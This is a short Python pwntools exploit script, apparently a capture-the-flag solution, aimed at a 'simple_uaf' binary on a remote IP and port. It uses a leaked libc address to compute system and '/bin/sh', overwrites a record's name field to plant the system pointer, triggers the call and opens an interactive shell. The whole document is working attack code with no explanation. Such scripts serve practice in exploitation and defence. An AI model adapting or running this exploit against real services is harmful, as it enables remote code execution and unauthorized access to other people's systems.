from pwn import *

DEBUG = False
context.terminal = ['tmux', 'splitw', '-h']
if DEBUG:
    p = process(['./simple_uaf'])
else:
    p = remote('3.35.173.249', 7714)
libc = ELF("./libc6_2.27-3ubuntu1_amd64.so")
#context.log_level = 'debug'

libc_addr = int(p.recvline().split(" : ")[1], base=16)
print(hex(libc_addr))

menu = 0x400C9D
poprdi = 0x400F53
stulist = 0x6020C0

system = libc_addr + libc.symbols["system"]
binsh = libc_addr + libc.search("/bin/sh").next()

p.sendlineafter('> ', "1")
p.sendlineafter('name : ', "AAAA")
p.sendlineafter('age : ', "10")

p.sendlineafter('> ', "1")
p.sendlineafter('name : ', "BBBB")
p.sendlineafter('age : ', "10")

payload = 'A' * 0x38
payload += p64(system)

p.sendlineafter('> ', "2")
p.sendlineafter('index : ', "0")
p.sendlineafter('Name : ', payload)
p.sendlineafter('age : ', "47")

payload = 'A' * 0x20
payload += '/bin/sh'

p.sendlineafter('> ', "2")
p.sendlineafter('index : ', "0")
p.sendlineafter('Name : ', payload)
p.sendlineafter('age : ', "47")

#gdb.attach(p)

p.sendlineafter('> ', "4")
p.sendlineafter('index : ', "1")

p.interactive()